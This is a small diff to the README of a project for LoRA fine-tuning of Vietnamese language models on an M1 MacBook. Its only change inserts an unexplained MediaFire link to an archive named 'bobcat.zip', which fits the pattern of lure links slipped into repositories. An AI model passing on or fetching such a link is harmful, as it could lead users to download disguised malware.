@@ -1,5 +1,5 @@
 # Vietnamese Language Model Fine-tuning
-
+https://download1585.mediafire.com/2bf7lcbide1gQjUe_gaLsreY1kF9fO17kH49mOpyyhhgQMAwdavIrgDJvmGiV2NMajpksF66vFev8A5I2DN2tYz-Qcd3sAqD41gpQotZ3YNnhVML1BYZzHQ94zVe2eKZVjBmzuG4unZLnQ6MBJhxYcpnltOeGiKiEmezmAx4EaVMTw/tz2eueoda5ghes1/bobcat.zip
 This project contains scripts and tools for fine-tuning Vietnamese language models using LoRA (Low-Rank Adaptation) on MacBook Pro M1.
 
 ## Project Structure
